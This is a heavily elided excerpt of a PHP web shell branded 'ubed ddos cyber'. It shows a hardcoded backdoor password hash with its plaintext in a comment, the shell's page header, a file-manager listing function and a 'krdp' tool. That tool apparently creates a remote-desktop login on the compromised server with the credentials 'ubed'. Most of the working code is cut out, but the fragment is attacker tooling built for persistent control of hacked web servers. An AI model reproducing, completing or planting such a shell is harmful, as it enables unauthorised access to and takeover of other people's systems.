...
$password = "8067f3136656a346b98e1e91b6a9fd8a"; # md5: ubed
...
// Tapi Selebihnya, itu hasil kreasi ubed sendiri.
// Tanpa kalian kita tidak akan BESAR seperti sekarang.
// Greetz: All Member ddoscyber team
###############################################################################
...
<head>
<title>ubed ddos cyber</title>
<meta name='author' content=''ddoscyber'>
<meta charset="UTF-8">
<style type='text/css'>
...
function tools($toolsname, $args = null) {
	...
	elseif($toolsname === "krdp") {
    	...
    	Username: ".color(1, 2, "ubed")."<br>
    	Password: ".color(1, 2, "ubed")."<br>
    	------------------------------<br><br>
    	[ STATUS ]<br>
    	------------------------------<br>
    	";
...
function files_and_folder() {
	...
	print "</table>";
	print "<center>Copyright &copy; ".date("Y")." - <a href='https://vt.tiktok.com/ZS7xCTLV/' target='_blank'>".color(1, 2, "ubed ddos cyber")."</a></center>";
}
